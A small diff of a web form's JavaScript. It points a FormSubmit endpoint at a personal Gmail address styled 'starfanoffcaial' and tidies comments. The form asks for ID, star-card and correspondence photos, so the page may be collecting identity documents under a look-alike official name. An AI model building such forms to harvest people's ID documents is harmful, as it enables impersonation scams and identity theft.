@@ -268,8 +268,7 @@
         });
         
         // --- FormSubmit Configuration ---
-        // ⭐ CRITICAL: REPLACE 'REPLACE_WITH_YOUR_EMAIL@example.com' WITH YOUR ACTUAL EMAIL ADDRESS ⭐
-        // This endpoint uses FormSubmit's AJAX feature, allowing us to control the page flow.
+        // ⭐ CRITICAL: THIS HAS BEEN UPDATED to your new email address!
         const formSubmitEndpoint = 'https://formsubmit.co/ajax/starfanoffcaial@gmail.com'; 
         // ---------------------------------
 
@@ -293,7 +292,6 @@
 
             // Add confirmation that files were selected (since FormSubmit AJAX doesn't handle file uploads)
             data['IDPhotoSelected'] = !!document.getElementById('idPhoto').files[0] ? 'File Ready' : 'No File';
-            // FIX: Changed 'starCardCardPhoto' to 'starCardPhoto' to match the HTML element ID
             data['StarCardPhotoSelected'] = !!document.getElementById('starCardPhoto').files[0] ? 'File Ready' : 'No File';
             data['CorrespondencePhotoSelected'] = !!document.getElementById('correspondencePhoto').files[0] ? 'File Ready' : 'No File';
 
